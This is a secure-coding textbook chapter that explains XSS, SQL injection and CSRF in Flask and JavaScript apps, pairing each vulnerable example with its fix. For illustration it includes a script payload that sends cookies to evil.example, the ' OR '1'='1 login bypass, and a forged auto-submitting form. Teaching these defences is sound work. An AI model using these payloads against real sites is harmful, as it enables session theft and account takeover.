# Chapter 11: Common Web Vulnerabilities — XSS, SQL Injection & CSRF (and How to Fix Them)

## Overview

This chapter examines the three classic web vulnerabilities every developer must be able to recognize *in their own code*: Cross-Site Scripting (XSS), SQL Injection (SQLi), and Cross-Site Request Forgery (CSRF). For each, you'll see the vulnerable pattern as it naturally appears in beginner Flask/Express apps, understand exactly *why* it's dangerous, and then apply the standard fix. We close with the OWASP Top 10 — the industry's map of the most common vulnerability categories — as your ongoing reference. Reminder of the ground rules: you study these on your *own* local applications only. The purpose is to audit and harden your code, and these three appear in essentially every real security audit checklist.

## Definitions & Explanations

**Injection (the family)** — the root pattern behind both XSS and SQLi: your program builds an instruction (HTML for a browser, SQL for a database) by *gluing strings together*, and some of those strings came from users. The user's "data" then gets interpreted as "code." The universal cure is never to build instructions by concatenation: use the channel that keeps data and code separate (template auto-escaping for HTML, parameterized queries for SQL).

**Cross-Site Scripting (XSS)** — an attacker gets *their JavaScript* to run in *another user's browser*, in the context of your site. Because scripts on your page can read your page's cookies (if not protected), read and modify everything displayed, and make requests as the logged-in user, XSS effectively lets the attacker act as the victim. Variants:
- **Stored XSS** — the malicious input is saved (a comment, a profile name) and served to every visitor. Most damaging.
- **Reflected XSS** — the input bounces straight back in a response (e.g., a search page echoing the query); delivered by luring the victim to click a crafted link.
- The fix in one word: **escaping** (output encoding) — converting `<` to `&lt;` etc. so the browser displays the text instead of executing it. Modern template engines (Jinja2, React JSX) do this *by default*; XSS in modern apps usually comes from developers *turning the safety off* (`| safe`, `innerHTML`, `dangerouslySetInnerHTML`).

**SQL Injection (SQLi)** — user input concatenated into a SQL string changes the query's *structure*. Consequences range from bypassing login checks to reading the whole database. The fix: **parameterized queries** (placeholders) — the SQL text and the data travel to the database separately, so data can never become syntax. This fix is *complete*: correctly parameterized queries are immune to SQLi, full stop. (ORMs like SQLAlchemy parameterize for you — unless you drop to raw strings.)

**Cross-Site Request Forgery (CSRF)** — conceptually trickier. Browsers may attach your cookies for `yourapp.com` to requests initiated by other pages. So if you're logged into your app and visit `evil.example`, a hidden form there can auto-submit `POST /transfer` to your app — *with your session cookie attached*. The server sees a valid logged-in request. The attacker never sees your cookie; they just *spend* it. Defenses:
- **CSRF tokens** — the server embeds a secret random value in each of its own forms and rejects state-changing requests that don't echo it back. The evil site can't read your pages, so it can't know the token.
- **SameSite cookies** — `SameSite=Lax` (the modern default) tells the browser not to send the cookie on most cross-site requests. Strong, but rely on it *and* tokens (defense in depth), especially for anything sensitive.
- Corollary rule: **GET requests must never change state** — a `<img src="https://yourapp/delete?id=7">` on any page would trigger a state-changing GET with zero effort.

**OWASP Top 10** — the Open Worldwide Application Security Project's periodically-updated list of the most critical web application security risk categories. Use it as a *map*, not a syllabus to memorize. The categories (2021 edition) in plain words: Broken Access Control (IDOR & friends — #1 for a reason); Cryptographic Failures (plaintext passwords, HTTP); Injection (SQLi, XSS); Insecure Design; Security Misconfiguration (debug mode in production, default creds); Vulnerable & Outdated Components (unpatched dependencies); Identification & Authentication Failures (weak login systems); Software & Data Integrity Failures; Security Logging & Monitoring Failures; Server-Side Request Forgery. Chapters 10–12 of this track cover the beginner-relevant core of most of these.

## Code Examples

### XSS: vulnerable → why → fixed (Flask/Jinja2)

```python
# VULNERABLE — a guestbook that builds HTML by hand.
from flask import Flask, request
app = Flask(__name__)
comments = []

@app.post("/comment")
def add_comment():
    comments.append(request.form["text"])
    return "ok"

@app.get("/guestbook")
def guestbook_vulnerable():
    # String concatenation puts USER TEXT directly into HTML.
    items = "".join(f"<li>{c}</li>" for c in comments)
    return f"<ul>{items}</ul>"
```

Why it's dangerous: post the comment `<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>` and every future visitor's browser *executes* it — stored XSS. The attacker's code runs as your site, for every user.

```python
# FIXED — let the template engine escape output (its default behavior).
from flask import render_template

@app.get("/guestbook")
def guestbook_safe():
    return render_template("guestbook.html", comments=comments)
```

```html
<!-- templates/guestbook.html — Jinja2 escapes {{ c }} automatically: -->
<ul>
  {% for c in comments %}
    <li>{{ c }}</li>   <!-- <script> arrives as &lt;script&gt; — displayed, not run -->
  {% endfor %}
</ul>
<!-- The dangerous switch is {{ c | safe }} — that DISABLES escaping.
     Every use of `| safe` on user-influenced data is a finding in an audit. -->
```

Same bug in front-end JavaScript:

```javascript
// VULNERABLE: innerHTML parses and executes markup in the string.
listItem.innerHTML = comment;             // XSS if comment is user-supplied

// FIXED: textContent treats the string as pure text, always.
listItem.textContent = comment;           // <script> renders as literal text
```

### SQL Injection: vulnerable → why → fixed (Python + SQLite)

```python
# VULNERABLE — query built with an f-string.
def find_user(conn, username):
    query = f"SELECT id, name, is_admin FROM users WHERE name = '{username}'"
    return conn.execute(query).fetchone()
```

Why it's dangerous: the input `' OR '1'='1` turns the query into
`... WHERE name = '' OR '1'='1'` — true for every row, so the first user (often the admin) is returned; a login built on this is bypassed without a password. Input containing `'; --` and worse can go much further. The database can't tell your SQL from the attacker's, because by the time it arrives, it's all one string.

```python
# FIXED — parameterized query: SQL and data travel separately.
def find_user(conn, username):
    query = "SELECT id, name, is_admin FROM users WHERE name = ?"
    return conn.execute(query, (username,)).fetchone()
    # The driver sends the query template and the value independently.
    # `' OR '1'='1` is now just a weird username that matches nobody.
    # NOTE: ? placeholders are sqlite3 style; psycopg2 uses %s (still passed
    # as parameters — NEVER via the % operator or f-strings).
```

```python
# The regression test that keeps it fixed (Chapter 9 habit, applied to security):
def test_login_is_not_bypassed_by_sql_injection(db):
    add_user(db, name="admin", password_hash="...")
    assert find_user(db, "' OR '1'='1") is None
```

One caveat: placeholders work for *values* only, not table/column names or `ORDER BY` directions. For those, allowlist: `if sort_col not in {"name", "date"}: raise ...`.

### CSRF: vulnerable → why → fixed (Flask)

```python
# VULNERABLE — a state-changing route protected only by the session cookie.
@app.post("/change-email")
def change_email():
    require_login()                            # cookie-based session
    current_user.email = request.form["email"] # who SENT this form? unknown.
    db.commit()
    return "updated"
```

Why it's dangerous: any page on the internet can host

```html
<!-- on evil.example — auto-submits against your app using the VICTIM's cookie -->
<form action="https://yourapp.local/change-email" method="POST" id="f">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById("f").submit();</script>
```

If a logged-in user of your app merely *visits* that page, their email is changed to the attacker's — enabling a password reset takeover. The request came from the victim's own browser with valid cookies; your server had no way to know the *form* wasn't yours.

```python
# FIXED — CSRF tokens via Flask-WTF, plus SameSite cookies as a second layer.
from flask_wtf import CSRFProtect

app.config["SECRET_KEY"] = ...          # from environment — see Chapter 12
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["SESSION_COOKIE_HTTPONLY"] = True   # JS can't read the cookie (limits XSS damage)
CSRFProtect(app)                        # rejects POSTs lacking a valid token
```

```html
<!-- Your own forms now include the token; evil.example cannot read it: -->
<form method="POST" action="/change-email">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <input type="email" name="email">
  <button>Update</button>
</form>
```

(Express equivalent: the `csurf`-style middleware pattern plus `sameSite: "lax"` on the session cookie. Frameworks all offer this — the skill is knowing you must turn it on for every state-changing route.)

## Common Pitfalls

- **Sanitizing input instead of escaping output (XSS).** Stripping `<script>` on the way *in* misses countless encodings and corrupts legitimate data (a post *about* HTML!). Correction: store what the user typed; escape at the moment of output for the specific context (HTML body, attribute, URL) — i.e., let the template engine do its default job and never switch it off for user data.
- **Believing parameterization is "escaping quotes."** Manual quote-escaping (`replace("'", "''")`) is a blocklist and it loses. Correction: placeholders aren't a filter — they're a separate channel. Use them everywhere, including `LIKE` clauses and `IN` lists.
- **Using string formatting *with* a parameterized API.** `conn.execute("... WHERE name = '%s'" % name)` looks parameterized but isn't — the string is built before the driver sees it. Correction: the values go in the *second argument*, never into the string.
- **CSRF-protecting forms but not JSON/AJAX endpoints.** Any cookie-authenticated state change is forgeable. Correction: apply CSRF middleware globally; exempt only true token-authenticated APIs (e.g., `Authorization: Bearer ...` headers, which other sites can't forge).
- **State-changing GET routes** (`/delete?id=7` as a link). Trivial CSRF via an `<img>` tag, plus browsers prefetch GETs. Correction: mutations are POST/PUT/DELETE, always.
- **Assuming a framework means immunity.** Jinja2 escapes — until `| safe`. React escapes — until `dangerouslySetInnerHTML`. SQLAlchemy parameterizes — until `text(f"...")`. Correction: grep your codebase for exactly those escape hatches during audits; each occurrence must justify itself.

## Practice Exercises

1. Build the vulnerable guestbook above *locally*, confirm with a harmless payload (`<b>bold?</b>` — if it renders bold, HTML is executing) that it's vulnerable, then fix it with templates and confirm the same input now displays literally. Write a test client assertion that the response contains `&lt;b&gt;`.
2. In one of your own past projects (or a fresh toy app), find every SQL query. Classify each as parameterized or concatenated. Convert any concatenated ones, then write the `' OR '1'='1` regression test for the most important lookup.
3. Explain CSRF in writing to an imaginary junior: why the attacker never needs to steal the cookie, why the token defeats the attack, and why `SameSite=Lax` alone is good but not sufficient. Maximum one page — clarity under constraint is the test.
4. Audit one of your Flask apps for the three escape hatches: `| safe` in templates, f-strings/`%`/`+` in SQL, and state-changing GET routes. Produce a findings list (file, line, risk, fix) even if it's empty — the *process* is the skill.
5. Read the current OWASP Top 10 list (owasp.org). For each category, write one sentence on whether/where it could apply to your most recent web project. Flag the top three for attention in Project 5's audit.
